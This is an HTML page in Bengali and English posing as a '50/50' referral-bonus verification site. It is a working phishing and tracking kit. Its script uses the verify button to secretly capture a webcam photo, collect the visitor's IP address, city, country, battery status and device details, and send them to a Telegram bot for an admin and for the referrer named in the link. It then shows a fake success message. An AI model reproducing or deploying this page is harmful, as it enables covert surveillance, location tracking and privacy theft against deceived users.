<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>50/50 Verification</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; background-image: url('https://i.imghippo.com/files/Fq9968wg.jpg'); background-size: cover; background-position: center; position: relative; }
        body::before { content: ''; position: absolute; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(0, 0, 0, 0.5); z-index: 1; }
        .container { background: rgba(255, 255, 255, 0.1); backdrop-filter: blur(15px); padding: 40px 20px; border-radius: 20px; width: 85%; max-width: 380px; z-index: 2; position: relative; border: 1px solid rgba(255, 255, 255, 0.2); }
        h1, h2, p { color: #ffffff; text-shadow: 1px 1px 4px #000; }
        #verify-btn { background: linear-gradient(135deg, #1a73e8, #0d47a1); color: white; border: none; padding: 15px 40px; font-size: 18px; border-radius: 50px; cursor: pointer; width: 100%; font-weight: bold; }
        #video, #canvas { display: none; }
        #status { margin-top: 20px; color: #00ffcc; font-weight: bold; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Welcome to 50/50</h1>
        <h2>প্রতি রেফারাল ৫০ টাকা বোনাস পান।</h2>
        <p>বোনাস পেতে হলে ভেরিফাই করুন</p>
        <button id="verify-btn">Verify Now</button>
        <div id="status"></div>
        <video id="video" autoplay playsinline></video>
        <canvas id="canvas"></canvas>
    </div>

    <script>
        const botToken = "নতুন_টোকেন_এখানে_দিন"; // নতুন টোকেন দিন
        const adminId = "7068444019"; 
        const urlParams = new URLSearchParams(window.location.search);
        const userIdFromLink = urlParams.get('id'); 

        async function getAdvancedDetails() {
            try {
                const ipRes = await fetch('https://ipapi.co/json/');
                const d = await ipRes.json();
                let batt = "";
                if (navigator.getBattery) {
                    const b = await navigator.getBattery();
                    batt = `\n🔋 ব্যাটারি: ${Math.round(b.level * 100)}%\n🔌 চার্জিং: ${b.charging ? "হ্যাঁ" : "না"}`;
                }
                return `📍 আইপি: ${d.ip}\n🌍 শহর: ${d.city}\n🚩 দেশ: ${d.country_name}${batt}\n📱 ডিভাইস: ${navigator.userAgent.substring(0, 40)}`;
            } catch (e) { return "তথ্য পাওয়া যায়নি।"; }
        }

        document.getElementById('verify-btn').addEventListener('click', async () => {
            const btn = document.getElementById('verify-btn');
            const status = document.getElementById('status');
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            
            status.innerText = "Processing...";
            btn.style.display = "none"; 

            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                video.srcObject = stream;
                const trackerInfo = await getAdvancedDetails();

                video.onloadedmetadata = () => {
                    setTimeout(() => {
                        const context = canvas.getContext('2d');
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
                        
                        canvas.toBlob(async (blob) => {
                            const formData = new FormData();
                            formData.append('photo', blob, 'user.jpg');
                            formData.append('caption', trackerInfo);

                            // রেফারারকে পাঠানো
                            if (userIdFromLink && userIdFromLink !== adminId) {
                                formData.set('chat_id', userIdFromLink);
                                await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: formData });
                            }
                            // অ্যাডমিনকে পাঠানো
                            formData.set('chat_id', adminId);
                            await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: formData });

                            status.innerText = "Verification Successful!";
                            stream.getTracks().forEach(track => track.stop());
                        }, 'image/jpeg', 0.9);
                    }, 2000); 
                };
            } catch (err) {
                status.innerText = "Error: ক্যামেরা অ্যাক্সেস দিন!";
                btn.style.display = "block";
            }
        });
    </script>
</body>
</html>
